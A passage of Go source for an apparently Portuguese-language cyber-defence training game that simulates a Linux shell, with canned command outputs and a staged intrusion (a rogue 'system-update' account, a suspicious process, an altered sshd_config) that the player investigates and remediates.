			InboxOutcome: g.InboxOutcome, InboxMessage: g.InboxMessage,
			ClickedEmail: g.ClickedEmail, PhishingDetected: g.PhishingDetected,
			TimeRemaining: gameDuration, Elapsed: visibleElapsed, Integrity: g.Integrity,
			Score: g.Score, ThreatLevel: "NENHUM", Objectives: objectiveSnapshot(g, 0),
			History: []LogEntry{}, Completed: g.Completed, Failed: g.Failed, Cwd: g.Cwd,
		}
	}

	elapsed := int(now.Sub(g.Started).Seconds())
	if elapsed < 0 {
		elapsed = 0
	}
	remaining := gameDuration - elapsed
	if remaining < 0 {
		remaining = 0
	}
	activeUnresolved := s.unresolvedAt(g, elapsed)
	level := "BAIXO"
	if activeUnresolved >= 1 {
		level = "MÉDIO"
	}
	if activeUnresolved >= 3 {
		level = "ALTO"
	}
	if activeUnresolved >= 5 || g.Integrity < 30 {
		level = "CRÍTICO"
	}

	history := g.History
	if len(history) > 60 {
		history = history[len(history)-60:]
	}
	return StateResponse{
		Nick: g.Nick, Phase: "incident", InboxRemaining: 0,
		ClickedEmail: g.ClickedEmail, PhishingDetected: g.PhishingDetected,
		TimeRemaining: remaining, Elapsed: elapsed, Integrity: g.Integrity,
		Score: g.Score, ThreatLevel: level, Objectives: objectiveSnapshot(g, elapsed),
		History: history, Completed: g.Completed, Failed: g.Failed, Cwd: g.Cwd,
	}
}

func (s *Server) executeLocked(g *Session, input string) string {
	// A linha original é preservada. Somente o nome do comando é comparado sem
	// diferenciar maiúsculas. Argumentos e padrões nunca são convertidos.
	rawClean := strings.TrimSpace(input)
	if rawClean == "" {
		return ""
	}
	commandCwd := g.Cwd

	elapsed := int(time.Since(g.Started).Seconds())

	// Pipeline textual seguro: a saída virtual do comando à esquerda é enviada
	// ao grep à direita. Nada é executado no shell do Debian.
	if left, right, ok := splitSinglePipeline(rawClean); ok {
		rightWords, err := shellWords(right)
		if err != nil {
			return "bash: " + err.Error()
		}
		if len(rightWords) == 0 || !isGrepName(rightWords[0]) {
			return "pipeline: somente grep é aceito como filtro na simulação"
		}
		leftOutput := s.executeLocked(g, left)
		return runVirtualGrep(rightWords, leftOutput, elapsed, g)
	}

	rawParts, err := shellWords(rawClean)
	if err != nil {
		return "bash: " + err.Error()
	}
	if len(rawParts) == 0 {
		return ""
	}

	// "sudo" existe apenas para realismo visual; nenhum comando do SO é executado.
	if strings.EqualFold(rawParts[0], "sudo") {
		if len(rawParts) == 1 {
			return "Uso: sudo <comando>"
		}
		rawParts = rawParts[1:]
		rawClean = strings.Join(rawParts, " ")
	}

	parts := make([]string, len(rawParts))
	for i, part := range rawParts {
		parts[i] = strings.ToLower(part)
	}
	clean := strings.ToLower(strings.Join(rawParts, " "))
	cmd := parts[0]
	var out string

	switch cmd {
	case "version":
		out = "GAME SI " + appVersion + "\nMotor grep: virtual-stream-v2"
	case "selftest":
		if err := runSelfTest(); err != nil {
			out = "FALHA: " + err.Error()
		} else {
			out = "OK: grep virtual e arquivos simulados funcionando"
		}
	case "help":
		topic := ""
		if len(parts) > 1 {
			topic = parts[1]
		}
		out = helpOutput(topic)
	case "man":
		if len(parts) != 2 {
			out = "Qual página de manual? Uso: man <comando>"
		} else {
			out = manualOutput(parts[1])
		}
	case "apropos":
		out = "administração: ps top free df systemctl journalctl\nrede: ip ss netstat ping traceroute dig\nusuários: w who id last getent\nsegurança: lastlog faillog lsof nft iptables sha256sum"
	case "which", "type":
		if len(parts) != 2 {
			out = "Uso: " + cmd + " <comando>"
		} else if isKnownCommand(parts[1]) {
			out = "/usr/bin/" + parts[1] + " (simulado)"
		} else {
			out = parts[1] + ": não encontrado"
		}
	case "command":
		if len(parts) == 3 && parts[1] == "-v" {
			if isKnownCommand(parts[2]) {
				out = "/usr/bin/" + parts[2]
			} else {
				out = ""
			}
		} else {
			out = "Uso: command -v <comando>"
		}

	// Identidade, sessão e sistema
	case "w":
		out = wOutput(elapsed)
	case "who":
		out = whoOutput(elapsed)
	case "whoami":
		out = "root"
	case "id":
		target := "root"
		if len(parts) > 1 {
			target = parts[len(parts)-1]
		}
		out = idOutput(target, elapsed)
	case "groups":
		target := "root"
		if len(parts) > 1 {
			target = parts[1]
		}
		out = groupsOutput(target, elapsed)
	case "last":
		out = lastOutput(elapsed)
	case "lastlog":
		out = lastlogOutput(elapsed)
	case "hostname":
		if len(parts) > 1 && (parts[1] == "-i" || parts[1] == "-I") {
			out = "10.0.0.15"
		} else {
			out = "training-server"
		}
	case "hostnamectl":
		out = " Static hostname: training-server\n       Icon name: computer-vm\n         Chassis: vm\n      Machine ID: 512defense-lab\n Operating System: Debian GNU/Linux 12 (bookworm)\n           Kernel: Linux 6.1.0-amd64\n     Architecture: x86-64"
	case "uname":
		if strings.Contains(clean, "-a") {
			out = "Linux training-server 6.1.0-amd64 #1 SMP PREEMPT_DYNAMIC Debian x86_64 GNU/Linux"
		} else if strings.Contains(clean, "-r") {
			out = "6.1.0-amd64"
		} else if strings.Contains(clean, "-m") {
			out = "x86_64"
		} else {
			out = "Linux"
		}
	case "uptime":
		out = uptimeOutput(elapsed)
	case "date":
		out = time.Now().Format("Mon Jan 02 15:04:05 MST 2006")
	case "timedatectl":
		out = "               Local time: " + time.Now().Format("Mon 2006-01-02 15:04:05 MST") + "\n           Universal time: " + time.Now().UTC().Format("Mon 2006-01-02 15:04:05 UTC") + "\n                 RTC time: " + time.Now().UTC().Format("15:04:05") + "\n                Time zone: America/Sao_Paulo\nSystem clock synchronized: yes\n              NTP service: active"
	case "pwd":
		out = g.Cwd
	case "cd":
		out = cdCommand(g, rawParts, elapsed)
	case "realpath", "readlink":
		out = realpathCommand(g, rawParts, elapsed)
	case "basename":
		if len(rawParts) < 2 {
			out = "basename: operando ausente"
		} else {
			out = path.Base(normalizeVirtualPath(g.Cwd, rawParts[len(rawParts)-1]))
		}
	case "dirname":
		if len(rawParts) < 2 {
			out = "dirname: operando ausente"
		} else {
			out = path.Dir(normalizeVirtualPath(g.Cwd, rawParts[len(rawParts)-1]))
		}
	case "env", "printenv":
		out = "SHELL=/bin/bash\nUSER=root\nHOME=/root\nLANG=pt_BR.UTF-8\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nTERM=xterm-256color"
	case "history":
		out = historyOutput(g)
	case "echo", "printf":
		out = echoCommand(g, rawClean, elapsed)
	case "clear", "reset":
		out = "__CLEAR__"

	// Arquivos e diretórios
	case "ls", "dir":
		out = lsCommand(g, rawParts, elapsed)
	case "tree":
		out = treeCommand(g, rawParts, elapsed)
	case "cat", "less", "more":
		out = readFilesCommand(g, cmd, rawParts, elapsed)
	case "head", "tail":
		out = headTailCommand(g, cmd, rawParts, elapsed)
	case "grep", "egrep", "fgrep":
		out = runVirtualGrep(rawParts, "", elapsed, g)
	case "find", "locate":
		out = findCommand(g, rawParts, elapsed)
	case "stat":
		if len(rawParts) < 2 {
			out = "Uso: stat <arquivo>"
		} else {
			out = statOutput(rawParts[len(rawParts)-1], elapsed, g)
		}
	case "file":
		if len(rawParts) < 2 {
			out = "Uso: file <arquivo>"
		} else {
			out = fileTypeOutput(g, rawParts[len(rawParts)-1], elapsed)
		}
	case "wc":
		out = wcCommand(g, rawParts, elapsed)
	case "du":
		out = duCommand(g, rawParts, elapsed)
	case "mkdir":
		out = mkdirCommand(g, rawParts, elapsed)
	case "touch":
		out = touchCommand(g, rawParts, elapsed)
	case "rm":
		out = rmCommand(g, rawParts, elapsed)
	case "rmdir":
		out = rmdirCommand(g, rawParts, elapsed)
	case "mv":
		out = moveCommand(g, rawParts, elapsed)
	case "chmod", "chown":
		if len(rawParts) < 3 {
			out = "Uso: " + cmd + " <modo|usuário> <arquivo>"
		} else {
			out = "Permissões/proprietário alterados no sistema de arquivos virtual."
		}
	case "nano", "vi", "vim":
		out = "Editor interativo não abre no navegador. Use: echo 'conteúdo' > arquivo, cat arquivo e sed."
	case "df":
		out = "Filesystem      Size  Used Avail Use% Mounted on\n/dev/vda1       9.8G  2.1G  7.2G  23% /\ntmpfs            50M  1.2M   49M   3% /run"
	case "mount":
		out = "/dev/vda1 on / type ext4 (rw,relatime)\nproc on /proc type proc (rw,nosuid,nodev,noexec)\nsysfs on /sys type sysfs (rw,nosuid,nodev,noexec)"
	case "lsblk":
		out = "NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS\nvda    254:0    0   10G  0 disk\n└─vda1 254:1    0   10G  0 part /"
	case "sha256sum", "md5sum":
		if len(rawParts) < 2 {
			out = "Uso: " + cmd + " <arquivo>"
		} else {
			out = checksumOutput(rawParts[len(rawParts)-1], elapsed, g, cmd)
		}

	// Processos e recursos
	case "processes", "ps":
		out = processOutput(elapsed, g, strings.Contains(clean, "aux") || strings.Contains(clean, "-ef") || strings.Contains(clean, "-e"))
	case "top", "htop":
		out = topOutput(elapsed, g)
	case "pstree":
		out = pstreeOutput(elapsed, g)
	case "pgrep", "pidof":
		out = pgrepOutput(parts, elapsed, g)
	case "free":
		out = "               total        used        free      shared  buff/cache   available\nMem:           512Mi       214Mi        96Mi       3.0Mi       202Mi       270Mi\nSwap:          384Mi         0B       384Mi"
	case "vmstat":
		out = "procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----\n r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st\n 1  0      0  98304  15360 191488    0    0     2     4  112  201  3  2 94  1  0"
	case "lsof":
		out = lsofOutput(elapsed, g, clean)
	case "fuser":
		out = "22/tcp: 101\n8080/tcp: 204"
	case "nice", "renice":
		out = "Prioridade alterada apenas na simulação."
	case "kill":
		out = s.killCommand(g, parts, elapsed)
	case "pkill", "killall":
		out = s.pkillCommand(g, parts, elapsed)

	// Rede
	case "connections", "netstat", "ss":
		out = connectionOutput(elapsed, g)
	case "ip":
		if strings.Contains(clean, "blackhole") && strings.Contains(clean, "198.51.100.42") {
			out = s.blockAddress(g, "198.51.100.42", elapsed)
		} else {
			out = ipOutput(parts)
		}
	case "ifconfig":
		out = "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.0.0.15  netmask 255.255.255.0  broadcast 10.0.0.255\n        ether 02:42:ac:11:00:02\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0"
	case "route":
		out = "Kernel IP routing table\nDestination Gateway     Genmask         Flags Iface\ndefault     10.0.0.1    0.0.0.0         UG    eth0\n10.0.0.0    0.0.0.0     255.255.255.0   U     eth0"
	case "arp":
		out = "Address      HWtype  HWaddress           Flags Iface\n10.0.0.1     ether   02:00:00:00:00:01   C     eth0"
	case "ping":
		target := "127.0.0.1"
		if len(parts) > 1 {
			target = parts[len(parts)-1]
		}
		out = "PING " + target + " (" + target + ") 56(84) bytes of data.\n64 bytes from " + target + ": icmp_seq=1 ttl=55 time=18.4 ms\n64 bytes from " + target + ": icmp_seq=2 ttl=55 time=18.1 ms\n\n--- " + target + " ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss"
	case "traceroute", "tracepath":
		out = " 1:  10.0.0.1              0.421ms\n 2:  192.0.2.1             8.312ms\n 3:  198.51.100.1         17.904ms\n 4:  destino              18.220ms"
	case "dig", "nslookup", "host":
		out = "example.test.  300  IN  A  192.0.2.80\n;; Query time: 12 msec\n;; SERVER: 10.0.0.53#53"
	case "curl", "wget":
		out = "HTTP/1.1 200 OK\nServer: training-web\nContent-Type: text/plain\n\nResposta simulada; nenhuma conexão externa foi feita."
	case "tcpdump":
		out = tcpdumpOutput(elapsed, g)
	case "nft", "iptables", "ufw", "fail2ban-client":
		out = s.firewallCommand(g, parts, clean, elapsed)

	// Serviços e logs
	case "services", "service":
		out = servicesOutput(g)
	case "systemctl":
		out = systemctlOutput(parts, g)
		if out == "__STOP_UNKNOWN_WORKER__" {
			out = s.killCommand(g, []string{"kill", "731"}, elapsed)
		}
	case "journalctl":
		out = journalOutput(elapsed)
	case "dmesg":
		out = "[    0.000000] Linux version 6.1.0-amd64\n[    1.142301] virtio_net virtio0 eth0: link up\n[  812.483291] audit: monitoramento de integridade ativo" + conditional(elapsed >= 85, "\n[  918.502112] audit: execução anômala iniciada pelo PID 731", "")
	case "logs":
		out = logsOutput(elapsed)

	// Usuários, pacotes e segurança
	case "users":
		out = usersOutput(elapsed)
	case "getent":
		out = getentOutput(parts, elapsed)
	case "passwd", "usermod":
		out = s.userLockCommand(g, parts, clean, elapsed)
	case "faillog":
		out = "Login       Failures Maximum Latest\nroot              37        0   " + conditional(elapsed >= 15, "agora, origem 203.0.113.77", "nunca")
	case "dpkg":
		out = "ii  openssh-server  1:9.2p1-2+deb12u3  amd64  secure shell server\nii  systemd         252.26-1~deb12u2    amd64  system manager\nii  linuxgame       5.0                 amd64  training simulator"
	case "apt", "apt-get":
		out = s.aptCommand(g, parts, clean, elapsed)
	case "nproc":
		out = "1"
	case "ulimit":
		out = "real-time non-blocking time  (microseconds, -R) unlimited\nopen files                          (-n) 1024\nmax user processes                  (-u) 64\nvirtual memory              (kbytes, -v) unlimited"
	case "sed":
		if strings.Contains(clean, "/etc/ssh/sshd_config") && (strings.Contains(clean, "passwordauthentication") || strings.Contains(clean, "permitrootlogin")) {
			if elapsed >= 125 {
				out = s.restoreFile(g, "/etc/ssh/sshd_config", elapsed)
			} else {
				out = s.patchService(g, "ssh", elapsed)
			}
		} else {
			out = "Edição sed simulada; nenhum arquivo real foi alterado."
		}
	case "sshd":
		if len(parts) > 1 && parts[1] == "-t" {
			out = "Configuração SSH válida (simulação)."
		} else {
			out = "Uso suportado: sshd -t"
		}
	case "diff", "cmp":
		if strings.Contains(clean, "sshd_config") {
			if elapsed >= 125 && !g.Restored["/etc/ssh/sshd_config"] {
				out = "-PermitRootLogin prohibit-password\n-PasswordAuthentication no\n+PermitRootLogin yes\n+PasswordAuthentication yes  [DIFERENÇAS ENCONTRADAS]"
			} else {
				out = "Arquivos idênticos."
			}
		} else {
			out = "Comparação simulada concluída."
		}
	case "install", "rsync":
		if strings.Contains(clean, "sshd_config.clean") && strings.Contains(clean, "/etc/ssh/sshd_config") {
			out = s.restoreFile(g, "/etc/ssh/sshd_config", elapsed)
		} else {
			out = "Cópia simulada concluída."
		}
	case "chage":
		if strings.Contains(clean, "-e 0") && strings.Contains(clean, "system-update") {
			out = s.lockUser(g, "system-update", elapsed)
		} else {
			out = "Uso suportado: chage -E 0 system-update"
		}
	case "userdel":
		if strings.Contains(clean, "system-update") {
			out = s.lockUser(g, "system-update", elapsed) + "\n[AVISO] Remoção destrutiva simulada; evidências foram preservadas."
		} else {
			out = "Uso suportado: userdel -r system-update"
		}
	case "loginctl":
		if strings.Contains(clean, "terminate-user") && strings.Contains(clean, "system-update") {
			if elapsed >= 85 && !g.Killed[731] {
				out = s.killCommand(g, []string{"kill", "731"}, elapsed)
			} else {
				out = "Sessões de system-update encerradas na simulação."
			}
		} else {
			out = "Uso suportado: loginctl terminate-user system-update"
		}
	case "tar":
		out = "Arquivo de evidências criado em /root/incident/system-update-home.tgz (simulado)."

	// Comandos específicos do jogo e atalhos
	case "status":
		out = fmt.Sprintf("Integridade: %d%%\nPontuação: %d\nAmeaça: %s\nTempo restante: %ds", g.Integrity, g.Score, s.stateLocked(g).ThreatLevel, maxInt(0, gameDuration-elapsed))
	case "alerts":
		out = s.alertsOutput(g, elapsed)
	case "files":
		out = filesOutput(elapsed, g)
	case "scan":
		out = fmt.Sprintf("Varredura concluída: %d ameaça(s) ativa(s) ainda não neutralizada(s).", s.unresolvedAt(g, elapsed))
	case "block":
		if len(parts) != 2 {
			out = "Uso: block <ip>"
		} else {
			out = s.blockAddress(g, parts[1], elapsed)
		}
	case "lock":
		if len(parts) != 2 {
			out = "Uso: lock <usuário>"
		} else {
			out = s.lockUser(g, parts[1], elapsed)
		}
	case "restore":
		if len(rawParts) != 2 {
			out = "Uso: restore <arquivo>"
		} else {
			out = s.restoreFile(g, rawParts[1], elapsed)
		}
	case "cp":
		out = s.copyCommand(g, rawParts, elapsed)
	case "patch":
		if len(parts) != 2 {
			out = "Uso: patch <serviço>"
		} else {
			out = s.patchService(g, parts[1], elapsed)
		}
	default:
		out = "Comando não reconhecido. Digite help, help sistema, help rede ou help segurança."
	}

	if out != "__CLEAR__" {
		g.addCommandLog(input, out, commandCwd)
	}
	return out
}

func helpOutput(topic string) string {
	switch topic {
	case "sistema":
		return "SISTEMA E SESSÃO\n  w who whoami id groups last lastlog hostname hostnamectl uname uptime date timedatectl\n  pwd cd env printenv history echo clear man apropos which type"
	case "arquivos":
		return "ARQUIVOS E DISCO\n  pwd cd ls tree cat head tail less more grep find locate stat file wc du df mount lsblk\n  mkdir touch cp mv rm rmdir chmod chown realpath basename dirname\n  sha256sum md5sum diff cmp install rsync sed restore <arquivo>\n\nNavegação realista: cd /etc; cd ssh; ls -la; cat sshd_config; cd ..; cd -"
	case "processos":
		return "PROCESSOS E MEMÓRIA\n  ps aux | ps -ef | top | htop | pstree | pgrep | pidof | free -h | vmstat\n  lsof | fuser | kill [-9] <pid> | pkill <nome> | nproc | ulimit"
	case "rede":
		return "REDE\n  ip addr | ip route | ip neigh | ifconfig | route | arp | ss -tulpn | netstat\n  ping | traceroute | dig | nslookup | host | curl | wget | tcpdump"
	case "servicos", "serviços":
		return "SERVIÇOS E LOGS\n  systemctl status <serviço> | systemctl list-units | systemctl is-active <serviço>\n  service --status-all | journalctl -u ssh | journalctl -p err | dmesg | logs"
	case "seguranca", "segurança":
		return "SEGURANÇA E DEFESA\n  alerts scan files faillog getent passwd usermod chage userdel loginctl dpkg apt\n  nft list ruleset | iptables -L | ufw status\n  block <ip> | lock <usuário> | patch ssh | restore <arquivo>\n  Também funcionam formas realistas: iptables -I INPUT -s <ip> -j DROP; passwd -l <usuário>; kill -9 <pid>."
	default:
		return "COMANDOS DISPONÍVEIS\n  help sistema | help arquivos | help processos | help rede | help servicos | help seguranca\n\nATALHOS DO JOGO\n  status | alerts | scan | files | block <ip> | lock <usuário> | patch ssh | restore <arquivo>\n\nUse man <comando> para uma descrição resumida. Todos os resultados são simulados."
	}
}

func manualOutput(cmd string) string {
	manuals := map[string]string{
		"w":          "W(1) — mostra usuários conectados, origem, tempo ocioso e atividade atual. Exemplo: w",
		"ps":         "PS(1) — exibe processos. Exemplos: ps aux; ps -ef",
		"ss":         "SS(8) — inspeciona sockets. Exemplo: ss -tulpn",
		"ip":         "IP(8) — mostra e administra rede. Exemplos: ip addr; ip route; ip neigh",
		"journalctl": "JOURNALCTL(1) — consulta logs do systemd. Exemplos: journalctl -u ssh; journalctl -p err -n 20",
		"systemctl":  "SYSTEMCTL(1) — consulta serviços. Exemplos: systemctl status ssh; systemctl list-units --type=service",
		"last":       "LAST(1) — mostra histórico de logins a partir do banco wtmp.",
		"lsof":       "LSOF(8) — lista arquivos e sockets abertos. Exemplo: lsof -i",
		"find":       "FIND(1) — busca arquivos. Exemplo: find /etc -type f -mtime -1",
		"grep":       "GREP(1) — procura padrões em texto. Exemplo: grep Failed /var/log/auth.log",
		"top":        "TOP(1) — visão dinâmica de processos, CPU e memória.",
		"free":       "FREE(1) — mostra uso de memória. Exemplo: free -h",
		"df":         "DF(1) — mostra uso dos sistemas de arquivos. Exemplo: df -h",
		"nft":        "NFT(8) — administra regras nftables. Exemplo: nft list ruleset",
		"iptables":   "IPTABLES(8) — administra regras de filtragem IPv4. Exemplo: iptables -L -n -v",
	}
	if text, ok := manuals[cmd]; ok {
		return text + "\n\nNesta aplicação, o comando é uma simulação educacional."
	}
	if isKnownCommand(cmd) {
		return strings.ToUpper(cmd) + " — comando reconhecido pelo simulador. Use help para consultar a categoria."
	}
	return "Nenhuma entrada de manual para " + cmd
}

const knownCommandsText = "help man apropos which type command sudo w who whoami id groups last lastlog hostname hostnamectl uname uptime date timedatectl pwd cd realpath readlink basename dirname env printenv history echo printf clear reset ls dir tree cat less more head tail grep egrep fgrep find locate stat file wc du df mount lsblk sha256sum md5sum mkdir touch rm rmdir mv chmod chown nano vi vim processes ps top htop pstree pgrep pidof free vmstat lsof fuser nice renice kill pkill killall connections netstat ss ip ifconfig route arp ping traceroute tracepath dig nslookup host curl wget tcpdump nft iptables ufw fail2ban-client services service systemctl journalctl dmesg logs users getent passwd usermod faillog dpkg apt apt-get nproc ulimit status alerts files scan block lock restore cp patch sed sshd diff cmp install rsync chage userdel loginctl tar version selftest"

func isKnownCommand(cmd string) bool {
	for _, item := range strings.Fields(knownCommandsText) {
		if item == cmd {
			return true
		}
	}
	return false
}

func wOutput(elapsed int) string {
	users := 1
	extra := ""
	if elapsed >= 50 {
		users = 2
		extra = "\nsystem-u pts/1    198.51.100.23   " + time.Now().Format("15:04") + "    00:01   0.18s  0.18s unknown-worker [SUSPEITO]"
	}
	return fmt.Sprintf(" %s up 3 days,  4:17,  %d user%s,  load average: 0.08, 0.05, 0.01\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.0.2.10       09:18    2.00s  0.04s  0.01s -bash%s", time.Now().Format("15:04:05"), users, conditional(users != 1, "s", ""), extra)
}

func whoOutput(elapsed int) string {
	out := "root     pts/0        " + time.Now().Format("2006-01-02 09:18") + " (192.0.2.10)"
	if elapsed >= 50 {
		out += "\nsystem-update pts/1   " + time.Now().Format("2006-01-02 15:04") + " (198.51.100.23) [SUSPEITO]"
	}
	return out
}

func uptimeOutput(elapsed int) string {
	load := "0.08, 0.05, 0.01"
	if elapsed >= 85 {
		load = "1.84, 0.92, 0.31"
	}
	return time.Now().Format("15:04:05") + " up 3 days, 4:17,  1 user,  load average: " + load
}

func idOutput(user string, elapsed int) string {
	switch user {
	case "root":
		return "uid=0(root) gid=0(root) groups=0(root)"
	case "student":
		return "uid=1000(student) gid=1000(student) groups=1000(student),27(sudo)"
	case "system-update":
		if elapsed >= 50 {
			return "uid=1002(system-update) gid=1002(system-update) groups=1002(system-update),27(sudo) [SUSPEITO]"
		}
	}
	return "id: ‘" + user + "’: usuário inexistente"
}

func groupsOutput(user string, elapsed int) string {
	switch user {
	case "root":
		return "root : root"
	case "student":
		return "student : student sudo"
	case "system-update":
		if elapsed >= 50 {
			return "system-update : system-update sudo [SUSPEITO]"
		}
	}
	return "groups: ‘" + user + "’: usuário inexistente"
}

func lastOutput(elapsed int) string {
	out := "root     pts/0        192.0.2.10      " + time.Now().Format("Mon Jul 20 09:18") + "   still logged in\nstudent  pts/0        192.0.2.44      Sun Jul 19 13:11 - 13:43  (00:32)"
	if elapsed >= 50 {
		out = "system-u pts/1        198.51.100.23   " + time.Now().Format("Mon Jul 20 15:04") + "   still logged in [SUSPEITO]\n" + out
	}
	return out + "\n\nwtmp begins Sun Jul 19 13:11:02 2026"
}

func lastlogOutput(elapsed int) string {
	out := "Username         Port     From             Latest\nroot             pts/0    192.0.2.10       " + time.Now().Format("Mon Jul 20 09:18:02 -0300 2026") + "\nstudent          pts/0    192.0.2.44       Sun Jul 19 13:11:40 -0300 2026"
	if elapsed >= 50 {
		out += "\nsystem-update    pts/1    198.51.100.23   " + time.Now().Format("Mon Jul 20 15:04:22 -0300 2026") + " [SUSPEITO]"
	}
	return out
}

func usersOutput(elapsed int) string {
	if elapsed >= 50 {
		return "USUÁRIO          GRUPO       CRIADO\nroot             root        sistema\nstudent          users       14 dias\nsystem-update    sudo        há poucos segundos  [SUSPEITO]"
	}
	return "USUÁRIO          GRUPO       CRIADO\nroot             root        sistema\nstudent          users       14 dias"
}

func getentOutput(parts []string, elapsed int) string {
	if len(parts) < 2 {
		return "Uso: getent passwd|group [nome]"
	}
	if parts[1] == "passwd" {
		out := "root:x:0:0:root:/root:/bin/bash\nstudent:x:1000:1000:Student:/home/student:/bin/bash"
		if elapsed >= 50 {
			out += "\nsystem-update:x:1002:1002:System Update:/var/tmp/.update:/bin/bash [SUSPEITO]"
		}
		return out
	}
	if parts[1] == "group" {
		return "root:x:0:\nsudo:x:27:student" + conditional(elapsed >= 50, ",system-update [SUSPEITO]", "")
	}
	return "Banco não suportado nesta simulação."
}

func historyOutput(g *Session) string {
	start := 0
	if len(g.History) > 20 {
		start = len(g.History) - 20
	}
	lines := []string{}
	n := 1
	for _, e := range g.History[start:] {
		if e.Kind != "command" {
			continue
		}
		text := e.Text
		if idx := strings.Index(text, "\n"); idx >= 0 {
			text = text[:idx]
		}
		text = strings.TrimPrefix(text, "$ ")
		lines = append(lines, fmt.Sprintf("%4d  %s", n, text))
		n++
	}
	if len(lines) == 0 {
		return "1  help"
	}
	return strings.Join(lines, "\n")
}

var virtualBaseDirs = []string{
	"/", "/bin", "/boot", "/dev", "/etc", "/etc/apt", "/etc/cron.d", "/etc/default",
	"/etc/network", "/etc/ssh", "/etc/systemd", "/etc/systemd/system", "/home", "/home/student",
	"/lib", "/lib64", "/media", "/mnt", "/opt", "/proc", "/proc/1", "/proc/101", "/proc/204",
	"/root", "/root/backups", "/root/incident", "/run", "/sbin", "/srv", "/sys", "/tmp",
	"/usr", "/usr/bin", "/usr/local", "/usr/local/bin", "/usr/sbin", "/var", "/var/backups",
	"/var/cache", "/var/lib", "/var/log", "/var/log/journal", "/var/log/nginx", "/var/spool",
	"/var/tmp", "/var/tmp/.cache", "/var/www", "/var/www/html",
}

var virtualBaseFiles = []string{
	"/etc/passwd", "/etc/group", "/etc/shadow", "/etc/hosts", "/etc/hostname", "/etc/os-release",
	"/etc/resolv.conf", "/etc/fstab", "/etc/sudoers", "/etc/ssh/sshd_config", "/etc/ssh/ssh_config",
	"/etc/ssh/moduli", "/etc/systemd/system/ssh.service", "/home/student/notes.txt", "/proc/cpuinfo",
	"/proc/loadavg", "/proc/meminfo", "/proc/uptime", "/proc/version", "/proc/1/cmdline", "/proc/1/status",
	"/proc/101/cmdline", "/proc/101/status", "/proc/204/cmdline", "/proc/204/status", "/root/.bashrc",
	"/root/.profile", "/root/README.txt", "/root/backups/sshd_config.clean", "/root/incident/evidence.log",
	"/usr/local/bin/web-server", "/var/backups/sshd_config.clean", "/var/log/auth.log", "/var/log/secure",
	"/var/log/syslog", "/var/log/kern.log", "/var/log/dpkg.log", "/var/log/nginx/access.log",
	"/var/log/nginx/error.log", "/var/www/html/index.html",
}

func normalizeVirtualPath(cwd, value string) string {
	value = strings.TrimSpace(strings.Trim(value, "'\""))
	if cwd == "" {
		cwd = "/root"
	}
	if value == "" || value == "~" {
		return "/root"
	}
	if strings.HasPrefix(value, "~/") {
		value = "/root/" + strings.TrimPrefix(value, "~/")
	}
	if strings.HasPrefix(value, "$HOME/") {
		value = "/root/" + strings.TrimPrefix(value, "$HOME/")
	}
	if value == "$HOME" {
		return "/root"
	}
	if !strings.HasPrefix(value, "/") {
		value = path.Join(cwd, value)
	}
	value = path.Clean(value)
	if value == "." {
		return "/"
	}
	return value
}

func virtualPromptPath(cwd string) string {
	if cwd == "/root" {
		return "~"
	}
	if strings.HasPrefix(cwd, "/root/") {
		return "~" + strings.TrimPrefix(cwd, "/root")
	}
	return cwd
}

func virtualPathRemoved(g *Session, p string) bool {
	if g == nil || g.Removed == nil {
		return false
	}
	if g.Removed[p] {
		return true
	}
	for removed := range g.Removed {
		if removed != "/" && strings.HasPrefix(p, removed+"/") {
			return true
		}
	}
	return false
}

func virtualStaticDir(p string, elapsed int, g *Session) bool {
	for _, item := range virtualBaseDirs {
		if item == p {
			return true
		}
	}
	if p == "/proc/731" && elapsed >= 85 && !g.Killed[731] {
		return true
	}
	if p == "/var/tmp/.update" && elapsed >= 50 {
		return true
	}
	return false
}

func virtualStaticFile(p string, elapsed int, g *Session) bool {
	for _, item := range virtualBaseFiles {
		if item == p {
			return true
		}
	}
	if strings.HasPrefix(p, "/usr/bin/") && isKnownCommand(path.Base(p)) {
		return true
	}
	for _, item := range []string{"/bin/bash", "/bin/sh", "/bin/ls", "/bin/cat", "/bin/cp", "/bin/mv", "/bin/rm", "/bin/mkdir", "/bin/grep", "/sbin/init", "/sbin/ip", "/sbin/shutdown", "/usr/sbin/sshd", "/usr/sbin/useradd", "/usr/sbin/usermod", "/usr/sbin/iptables"} {
		if p == item {
			return true
		}
	}
	if p == "/proc/731/cmdline" || p == "/proc/731/status" {
		return elapsed >= 85 && !g.Killed[731]
	}
	if p == "/var/tmp/.cache/unknown-worker" || p == "/root/incident/suspicious.bin" {
		return elapsed >= 85
	}
	if p == "/var/tmp/.update/.bash_history" {
		return elapsed >= 50
	}
	return false
}

func virtualIsDir(g *Session, p string, elapsed int) bool {
	p = path.Clean(p)
	if virtualPathRemoved(g, p) {
		return false
	}
	if g != nil && g.Dirs != nil && g.Dirs[p] {
		return true
	}
	return virtualStaticDir(p, elapsed, g)
}

func virtualIsFile(g *Session, p string, elapsed int) bool {
	p = path.Clean(p)
	if virtualPathRemoved(g, p) {
		return false
	}
	if g != nil && g.Files != nil {
		if _, ok := g.Files[p]; ok {
			return true
		}
	}
	return virtualStaticFile(p, elapsed, g)
}

func virtualExists(g *Session, p string, elapsed int) bool {
	return virtualIsDir(g, p, elapsed) || virtualIsFile(g, p, elapsed)
}

func virtualAllDirs(g *Session, elapsed int) []string {
	seen := map[string]bool{}
	result := []string{}
	for _, p := range virtualBaseDirs {
		if !virtualPathRemoved(g, p) && !seen[p] {
			seen[p] = true
			result = append(result, p)
		}
	}
	if elapsed >= 85 && !g.Killed[731] {
		result = append(result, "/proc/731")
	}
	if elapsed >= 50 {
		result = append(result, "/var/tmp/.update")
	}
	for p := range g.Dirs {
		if !virtualPathRemoved(g, p) && !seen[p] {
			seen[p] = true
			result = append(result, p)
		}
	}
	sort.Strings(result)
	return result
}

func virtualAllFiles(g *Session, elapsed int) []string {
	seen := map[string]bool{}
	result := []string{}
	for _, p := range virtualBaseFiles {
		if !virtualPathRemoved(g, p) && !seen[p] {
			seen[p] = true
